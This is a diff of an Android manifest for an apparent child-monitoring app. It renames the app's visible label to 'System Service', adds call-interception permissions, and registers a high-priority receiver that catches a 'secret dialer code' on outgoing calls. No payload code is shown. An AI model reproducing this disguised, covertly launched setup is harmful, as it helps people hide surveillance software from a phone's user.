@@ -1,23 +1,38 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.anascontrol.child">
 
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
-
+    <!-- Secret Dialer Code ko detect karne ki permissions -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
     <application
-        android:allowBackup="false"
-        android:label="ANAS Control Child"
-        android:theme="@android:style/Theme.Material.Light.NoActionBar">
-
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="System Service" 
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+        
+        <!-- Main Activity -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
-
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-
         </activity>
+
+        <!-- Secret Dialer Code Receiver (Priority 999 to catch it first) -->
+        <receiver
+            android:name=".CallReceiver"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
+
     </application>
 </manifest>
